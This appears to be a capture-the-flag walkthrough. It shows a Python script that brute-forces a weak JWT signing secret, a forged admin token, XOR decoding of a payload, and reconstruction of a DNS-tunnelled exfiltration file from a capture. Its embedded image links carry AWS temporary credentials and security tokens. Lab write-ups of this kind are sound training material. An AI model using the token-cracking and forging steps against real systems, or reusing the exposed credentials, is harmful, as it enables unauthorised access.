bnQaRIb33OOzWECY9%2B9lJ5U75Ehxj1g2V1lcBMiRlE3vLrWHNDiq3oZcyaX7WZZtSaTf8Doq7DHPh%2Bdz&X-Amz-Signature=5d4c71f0dbf61d7dd239f7faec49d6911c2c33d6fcda73dc9b3024293dc533ef&X-Amz-SignedHeaders=host&x-amz-checksum-mode=ENABLED&x-id=GetObject",
+      "caption": ""
+    },
+    {
+      "type": "paragraph",
+      "content": "sending a post request "
+    },
+    {
+      "type": "image",
+      "content": "https://prod-files-secure.s3.us-west-2.amazonaws.com/7a19a792-95ed-444b-9a77-2b1a0193aa5e/7c67434d-a6c8-4567-bec9-adbcd9ddf255/image.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB466XWZ7UCCS%2F20260608%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260608T094508Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEOr%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCIGH9nSx4jmLTLB7GkrDQrYg6fNdaEELiLO%2FsYn9eXDjQAiB6MD2AFlrnGpnc%2FmzYT8%2ByvCfpoVSOliGwrwxyq0kc5CqIBAiz%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAAaDDYzNzQyMzE4MzgwNSIMx%2FqkXxp2Fqq3JlBuKtwDAYtwLONnG8HBotIdvliQp%2FQu%2F7Nni%2Fx0vdB5QhkVW%2BA2k2K5qc6Dg4Kh7GyvJeR1AQhW7lug5cVWmS9Y2VynEt1tECjp1F5ScuynYRVPRxNa5AOfO1noiAg75Ic5m9tiovI57iUPat72ekNNxImQ3ea8N313bIMBxN3vKjsRkYeAN%2FmA5G6yGCS1aENXVYUovVSo35jggfL2JOfYXQ%2FHltFFeAoe0GXHQdIw6ewLoG22vdpxqdTerFQwIPvw4G3xW4FuUWCzm4lnxKqp3qJD0ZppGsT4xqhJdSQZ7YHby7G99j213kfuA6oP20q3eXqVDHG4hT6zhfomg53m9HRlDusj86xv0VxszBLjUB5jm4IZSfdLlvzyKtYY%2FqeVpUzVQ5aiXArgH4DtDI9%2FmDXkQgTQ1cPi69eXTUZrE%2F6aKGqqtJPkqqYA5nCGmpFeYgKTSc43rEridkt0LY%2B4PQMwIHXr8uT%2BtBq%2BhiNsxLpWORyU3w112vP%2FCoywRVmUWiC7JW6K0OcVi8PVFizzb3ioColcSOe%2Fp%2BKiqV8EUwVLJiryAXnES8oxE%2FR%2FpwJK%2BGdoz4BsXI4oYnoBRwAiKWRPsKnD5Kk98iYHij%2B1CmQ6I0jsUrp7xgG6hZyNV20w8Zaa0QY6pgE08dweph2OUvBnsPDdF6rGL8om1eTWRgLLmDKE1vQO9pg1KrA9QY5acAqfSVIVNGiR%2FmXTydmICcxVv55QKenNqrN9InsoGEA4SJtY4xvyF5PjvjqhzRB5szQQUDb0O44clG6awj9muwdpbnQaRIb33OOzWECY9%2B9lJ5U75Ehxj1g2V1lcBMiRlE3vLrWHNDiq3oZcyaX7WZZtSaTf8Doq7DHPh%2Bdz&X-Amz-Signature=1c492a30cdaa168cf7d7b5410f03a502badc265efc2cec66a70b979bde06be55&X-Amz-SignedHeaders=host&x-amz-checksum-mode=ENABLED&x-id=GetObject",
+      "caption": ""
+    },
+    {
+      "type": "paragraph",
+      "content": "now as suggested The signing algorithm is HS256. The secret is weak. lets try to crack the secret"
+    },
+    {
+      "type": "paragraph",
+      "content": "from the hint Sometimes all you need is a bit of context. it is suggesting that something related from the ctf is secret"
+    },
+    {
+      "type": "paragraph",
+      "content": " "
+    },
+    {
+      "type": "code",
+      "content": "#!/usr/bin/env python3\n\nimport jwt\nimport itertools\n\nTOKEN = \"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiY29udHJhY3RvciIsInJvbGUiOiJ2aWV3ZXIiLCJpZCI6MTA5OSwiaWF0IjoxNzI4MDAwMDAwfQ.sR9LvxSW44ABeHio_vl7zZU36NTewC33rGJES4zlT8I\"\n\nwords = [\n    # Flags\n    \"r3c0n_b3g1ns\",\n    \"h1dd3n_1n_pl41n\",\n    \"VC\",\n    \"VC{r3c0n_b3g1ns}\",\n    \"VC{h1dd3n_1n_pl41n}\",\n\n    # Deployment\n    \"svc_deploy\",\n    \"Winter2026\",\n    \"Winter2026!\",\n    \"VCPortal\",\n    \"Portal\",\n\n    # Company\n    \"Vanguard\",\n    \"vanguard\",\n    \"VanguardCyber\",\n    \"vanguardcyber\",\n    \"vanguardcyber.com.au\",\n    \"ctf001\",\n    \"ctf-001\",\n\n    # API\n    \"contractor\",\n    \"viewer\",\n    \"admin\",\n    \"employee\",\n    \"employeeportal\",\n    \"TemporaryAccess\",\n    \"ExternalContractor\",\n\n    # Author\n    \"Kyle\",\n    \"Murray\",\n    \"KyleMurray\",\n    \"kylemurray\",\n]\n\nseparators = [\"\", \"_\", \"-\", \".\", \":\", \"@\", \"!\"]\n\ntested = set()\n\ndef check(secret):\n    if secret in tested:\n        return False\n    tested.add(secret)\n\n    try:\n        jwt.decode(\n            TOKEN,\n            secret,\n            algorithms=[\"HS256\"],\n            options={\"verify_iat\": False}\n        )\n\n        print(\"\\n[+] FOUND SECRET:\", secret)\n        exit(0)\n\n    except Exception:\n        return False\n\n\nprint(\"[*] Testing base words\")\n\nfor word in words:\n    check(word)\n\nprint(\"[*] Testing mutations\")\n\nfor word in words:\n    for suffix in [\n        \"2024\",\"2025\",\"2026\",\n        \"!\",\"!!\",\"123\",\"1234\",\n        \"_dev\",\"_prod\",\"_portal\"\n    ]:\n        check(word + suffix)\n\nprint(\"[*] Testing combinations\")\n\nfor a, b in itertools.permutations(words, 2):\n    for sep in separators:\n        check(a + sep + b)\n\nprint(\"[*] Testing triple combinations\")\n\nfor a, b in itertools.permutations(words, 2):\n    check(a + \"_\" + b + \"_2026\")\n    check(a + b + \"2026\")\n    check(a + \"_\" + b)\n\nprint(\"[-] No secret found\")",
+      "language": "python"
+    },
+    {
+      "type": "paragraph",
+      "content": "this gave us the secret [+] FOUND SECRET: vanguardcyber2026\n"
+    },
+    {
+      "type": "paragraph",
+      "content": "now lets generate some tokens "
+    },
+    {
+      "type": "code",
+      "content": "┌──(root㉿kali)-[/home/kali/Desktop/vg_op_meridian]\n└─# cat jwt_generate.py \nimport jwt\nimport time\n\nsecret = \"vanguardcyber2026\"\n\npayload = {\n    \"user\": \"admin\",\n    \"role\": \"admin\",\n    \"id\": 1001,\n    \"iat\": int(time.time())\n}\n\ntoken = jwt.encode(payload, secret, algorithm=\"HS256\")\n\nprint(token)\n",
+      "language": "python"
+    },
+    {
+      "type": "code",
+      "content": "┌──(root㉿kali)-[/home/kali/Desktop/vg_op_meridian]\n└─# python jwt_generate.py  \n/usr/lib/python3/dist-packages/jwt/api_jwt.py:147: InsecureKeyLengthWarning: The HMAC key is 17 bytes long, which is below the minimum recommended length of 32 bytes for SHA256. See RFC 7518 Section 3.2.\n  return self._jws.encode(\neyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoiYWRtaW4iLCJpZCI6MTAwMSwiaWF0IjoxNzgwMTU1NDA5fQ.2iSQF1NB5Kr_8D1i-7h5hbBJnFXZEgvKw-SYL6u0GZ8\n",
+      "language": "python"
+    },
+    {
+      "type": "paragraph",
+      "content": "with the admin jwt token "
+    },
+    {
+      "type": "code",
+      "content": "{\"profile\":{\"clearance\":\"TOP SECRET\",\"department\":\"Security\",\"flag\":\"VC{jwt_n0_s3cr3t}\",\"id\":1001,\"internal_memo\":\"OPERATIVE INTEL: You cracked the JWT secret and escalated via IDOR. The insider left an encoded payload. Path: /vault-0f86a9b6-04d8-4cd9-a33d-9ca68b517a86/payload.bin. \",\"name\":\"Kyle Murray\",\"note\":\"Binary drop left in /vault-0f86a9b6-04d8-4cd9-a33d-9ca68b517a86/payload.bin - access may depend on knowing who it belonged with an XOR key\",\"role_title\":\"Principal Consultant\"},\"status\":\"ok\"}\n",
+      "language": "json"
+    },
+    {
+      "type": "image",
+      "content": "https://prod-files-secure.s3.us-west-2.amazonaws.com/7a19a792-95ed-444b-9a77-2b1a0193aa5e/db881d8d-0ab7-4b39-a7df-3e481e548f8c/image.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB466XWZ7UCCS%2F20260608%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260608T094508Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEOr%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCIGH9nSx4jmLTLB7GkrDQrYg6fNdaEELiLO%2FsYn9eXDjQAiB6MD2AFlrnGpnc%2FmzYT8%2ByvCfpoVSOliGwrwxyq0kc5CqIBAiz%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAAaDDYzNzQyMzE4MzgwNSIMx%2FqkXxp2Fqq3JlBuKtwDAYtwLONnG8HBotIdvliQp%2FQu%2F7Nni%2Fx0vdB5QhkVW%2BA2k2K5qc6Dg4Kh7GyvJeR1AQhW7lug5cVWmS9Y2VynEt1tECjp1F5ScuynYRVPRxNa5AOfO1noiAg75Ic5m9tiovI57iUPat72ekNNxImQ3ea8N313bIMBxN3vKjsRkYeAN%2FmA5G6yGCS1aENXVYUovVSo35jggfL2JOfYXQ%2FHltFFeAoe0GXHQdIw6ewLoG22vdpxqdTerFQwIPvw4G3xW4FuUWCzm4lnxKqp3qJD0ZppGsT4xqhJdSQZ7YHby7G99j213kfuA6oP20q3eXqVDHG4hT6zhfomg53m9HRlDusj86xv0VxszBLjUB5jm4IZSfdLlvzyKtYY%2FqeVpUzVQ5aiXArgH4DtDI9%2FmDXkQgTQ1cPi69eXTUZrE%2F6aKGqqtJPkqqYA5nCGmpFeYgKTSc43rEridkt0LY%2B4PQMwIHXr8uT%2BtBq%2BhiNsxLpWORyU3w112vP%2FCoywRVmUWiC7JW6K0OcVi8PVFizzb3ioColcSOe%2Fp%2BKiqV8EUwVLJiryAXnES8oxE%2FR%2FpwJK%2BGdoz4BsXI4oYnoBRwAiKWRPsKnD5Kk98iYHij%2B1CmQ6I0jsUrp7xgG6hZyNV20w8Zaa0QY6pgE08dweph2OUvBnsPDdF6rGL8om1eTWRgLLmDKE1vQO9pg1KrA9QY5acAqfSVIVNGiR%2FmXTydmICcxVv55QKenNqrN9InsoGEA4SJtY4xvyF5PjvjqhzRB5szQQUDb0O44clG6awj9muwdpbnQaRIb33OOzWECY9%2B9lJ5U75Ehxj1g2V1lcBMiRlE3vLrWHNDiq3oZcyaX7WZZtSaTf8Doq7DHPh%2Bdz&X-Amz-Signature=97aad868214be7c0c68e70f39a1e17533b5da7b896f03b83fb5b06dd08ab4379&X-Amz-SignedHeaders=host&x-amz-checksum-mode=ENABLED&x-id=GetObject",
+      "caption": ""
+    },
+    {
+      "type": "heading_1",
+      "content": "Flag 3 "
+    },
+    {
+      "type": "paragraph",
+      "content": "VC{jwt_n0_s3cr3t}"
+    },
+    {
+      "type": "paragraph",
+      "content": "lets check the  .bin file "
+    },
+    {
+      "type": "paragraph",
+      "content": "Initial checks:"
+    },
+    {
+      "type": "code",
+      "content": "file payload.bin\nent payload.bin",
+      "language": "plain text"
+    },
+    {
+      "type": "paragraph",
+      "content": "Results:"
+    },
+    {
+      "type": "code",
+      "content": "Entropy: 5.76",
+      "language": "plain text"
+    },
+    {
+      "type": "paragraph",
+      "content": "This indicated:"
+    },
+    {
+      "type": "code",
+      "content": "Repeating-key XOR",
+      "language": "plain text"
+    },
+    {
+      "type": "paragraph",
+      "content": "rather than encryption."
+    },
+    {
+      "type": "paragraph",
+      "content": "Typical entropy"
+    },
+    {
+      "type": "paragraph",
+      "content": "using xortool "
+    },
+    {
+      "type": "code",
+      "content": "──(venv)─(root㉿kali)-[/home/kali/Desktop/vg_op_meridian]\n└─# xortool payload.bin\nThe most probable key lengths:\n 1:  10.9%\n 4:  19.0%\n 8:  15.5%\n12:  12.5%\n16:  10.2%\n18:   5.3%\n20:   8.3%\n24:   7.1%\n28:   6.2%\n32:   5.0%\nKey-length can be 4*n\nMost possible char is needed to guess the key!\n\n──(venv)─(root㉿kali)-[/home/kali/Desktop/vg_op_meridian]\n└─# xortool payload.bin -c 20\nThe most probable key lengths:\n 1:  10.9%\n 4:  19.0%\n 8:  15.5%\n12:  12.5%\n16:  10.2%\n18:   5.3%\n20:   8.3%\n24:   7.1%\n28:   6.2%\n32:   5.0%\nKey-length can be 4*n\n1 possible key(s) of length 4:\n1001\nFound 1 plaintexts with 95%+ valid characters\nSee files filename-key.csv, filename-char_used-perc_valid.csv\n\n                                                                                                                                                                                            \n┌──(venv)─(root㉿kali)-[/home/kali/Desktop/vg_op_meridian/xortool_out]\n└─# cat 0.out      \n#!/usr/bin/env python3\n# Vanguard Cyber -- Recovered Internal Diagnostic Script\n# Classification: RESTRICTED\n# Author: K. Murray\n\nimport sys\n\nEMPLOYEE_DATABASE = {\n    1001: {\"name\": \"Sarah Okafor\",  \"dept\": \"Security\",     \"clearance\": \"TOP SECRET\"},\n    1002: {\"name\": \"Tom Reeves\",    \"dept\": \"Ops\",          \"clearance\": \"SECRET\"},\n    1003: {\"name\": \"Priya Nair\",    \"dept\": \"Engineering\",  \"clearance\": \"SECRET\"},\n    1099: {\"name\": \"Contractor\",    \"dept\": \"Temporary\",    \"clearance\": \"BASIC\"},\n}\n\nEXFIL_LOG = [\n    \"2024-10-01 02:14:33  --  sent:  design_specs_v3.tar.gz  -->  c2.vc-exfil.com\",\n    \"2024-10-08 03:02:11  --  sent:  auth_keys_backup.zip    -->  c2.vc-exfil.com\",\n    \"2024-10-15 01:55:44  --  sent:  customer_db_dump.sql    -->  c2.vc-exfil.com\",\n]\n\nprint()\nprint(\"=\" * 60)\nprint(\"  VANGUARD CYBER -- INTERNAL DIAGNOSTIC TOOL v1.0\")\nprint(\"=\" * 60)\nprint()\nprint(\"VC{x0r_0f_th3_d3v1l}\")\nprint()\nprint(\"OPERATIVE INTEL: Well done. XOR with key '1001' recovered\")\nprint(\"this script. The exfil log shows the insider sent data to\")\nprint(\"c2.vc-exfil.com via covert DNS tunnelling.\")\nprint()\nprint(\"Your final task: recover the PCAP at /forensics-bcb9a368-fe7b-4073-9349-bb0f0d771afa/capture.pcap\")\nprint(\"Reconstruct the exfiltrated file from DNS query subdomains.\")\nprint()\nprint(\"[EXFIL LOG -- last 3 transmissions]\")\nfor entry in EXFIL_LOG:\n    print(\" \", entry)\nprint() ",
+      "language": "shell"
+    },
+    {
+      "type": "heading_1",
+      "content": "Flag 4"
+    },
+    {
+      "type": "paragraph",
+      "content": "VC{x0r_0f_th3_d3v1l}"
+    },
+    {
+      "type": "paragraph",
+      "content": "now checking the pcap"
+    },
+    {
+      "type": "paragraph",
+      "content": "open with wireshark"
+    },
+    {
+      "type": "paragraph",
+      "content": "you will see the dns name as some hash.seqXXXX.c2.vc-exfil.com "
+    },
+    {
+      "type": "image",
+      "content": "https://prod-files-secure.s3.us-west-2.amazonaws.com/7a19a792-95ed-444b-9a77-2b1a0193aa5e/28e30521-23e3-42d6-a815-6d5c3e01c0ab/image.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB466XWZ7UCCS%2F20260608%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260608T094508Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEOr%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCIGH9nSx4jmLTLB7GkrDQrYg6fNdaEELiLO%2FsYn9eXDjQAiB6MD2AFlrnGpnc%2FmzYT8%2ByvCfpoVSOliGwrwxyq0kc5CqIBAiz%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAAaDDYzNzQyMzE4MzgwNSIMx%2FqkXxp2Fqq3JlBuKtwDAYtwLONnG8HBotIdvliQp%2FQu%2F7Nni%2Fx0vdB5QhkVW%2BA2k2K5qc6Dg4Kh7GyvJeR1AQhW7lug5cVWmS9Y2VynEt1tECjp1F5ScuynYRVPRxNa5AOfO1noiAg75Ic5m9tiovI57iUPat72ekNNxImQ3ea8N313bIMBxN3vKjsRkYeAN%2FmA5G6yGCS1aENXVYUovVSo35jggfL2JOfYXQ%2FHltFFeAoe0GXHQdIw6ewLoG22vdpxqdTerFQwIPvw4G3xW4FuUWCzm4lnxKqp3qJD0ZppGsT4xqhJdSQZ7YHby7G99j213kfuA6oP20q3eXqVDHG4hT6zhfomg53m9HRlDusj86xv0VxszBLjUB5jm4IZSfdLlvzyKtYY%2FqeVpUzVQ5aiXArgH4DtDI9%2FmDXkQgTQ1cPi69eXTUZrE%2F6aKGqqtJPkqqYA5nCGmpFeYgKTSc43rEridkt0LY%2B4PQMwIHXr8uT%2BtBq%2BhiNsxLpWORyU3w112vP%2FCoywRVmUWiC7JW6K0OcVi8PVFizzb3ioColcSOe%2Fp%2BKiqV8EUwVLJiryAXnES8oxE%2FR%2FpwJK%2BGdoz4BsXI4oYnoBRwAiKWRPsKnD5Kk98iYHij%2B1CmQ6I0jsUrp7xgG6hZyNV20w8Zaa0QY6pgE08dweph2OUvBnsPDdF6rGL8om1eTWRgLLmDKE1vQO9pg1KrA9QY5acAqfSVIVNGiR%2FmXTydmICcxVv55QKenNqrN9InsoGEA4SJtY4xvyF5PjvjqhzRB5szQQUDb0O44clG6awj9muwdpbnQaRIb33OOzWECY9%2B9lJ5U75Ehxj1g2V1lcBMiRlE3vLrWHNDiq3oZcyaX7WZZtSaTf8Doq7DHPh%2Bdz&X-Amz-Signature=d4baea2009aeb65e6df565432e67de2e3647d741e43825c172e418424ed64cd9&X-Amz-SignedHeaders=host&x-amz-checksum-mode=ENABLED&x-id=GetObject",
+      "caption": ""
+    },
+    {
+      "type": "paragraph",
+      "content": "so using tshark extract all these files with hash "
+    },
+    {
+      "type": "code",
+      "content": "┌──(root㉿kali)-[/home/kali/Desktop/vg_op_meridian]\n└─# tshark -r capture.pcap \\                                                                    \n-Y 'dns.qry.name contains \"c2.vc-exfil.com\"' \\\n-T fields -e dns.qry.name > dns.txt\n",
+      "language": "shell"
+    },
+    {
+      "type": "paragraph",
+      "content": "now "
+    },
+    {
+      "type": "code",
+      "content": "┌──(root㉿kali)-[/home/kali/Desktop/vg_op_meridian]\n└─# sort -t'.' -k2 dns.txt | sed 's/\\.seq[0-9]\\+\\.c2\\.vc-exfil\\.com//' | tr -d '\\n' | base32 -d                \n=== VANGUARD CYBER -- EXFILTRATED SECRETS FILE ===\nClassification: TOP SECRET\nExfil date: 2026-05-15 01:55:44 UTC\nOperator: MERIDIAN\n\n--- Section A: R&D Pipeline ---\nProject AURORA: Quantum-resistant VPN kernel module (release Q3 2025)\nProject HELIOS: AI threat detection -- dataset: s3://vc-ml-private/helios/\nProject CHIMERA: Zero-day broker contract ref: ZD-4471-CLASSIFIED\n\n--- Section B: Sample Client Keys ---\nClient: AusDOD-7    API_KEY: 7a2f9c...REDACTED\nClient: BANKWEST-2  API_KEY: f33b01...REDACTED\n\n--- Section C: Personnel ---\nInsider MERIDIAN has copies of all the above.\n\nVC{p4ck3ts_d0nt_l13}\n\nOPERATIVE INTEL: You reconstructed the DNS exfiltration channel.\nOperation MERIDIAN is concluded. Congratulations on solving all 5 stages.\n=== END FILE ===\n",
+      "language": "shell"
+    },
+    {
+      "type": "heading_1",
+      "content": "Flag 5"
+    },
+    {
+      "type": "paragraph",
+      "content": "VC{p4ck3ts_d0nt_l13}"
+    }
+  ]
+}
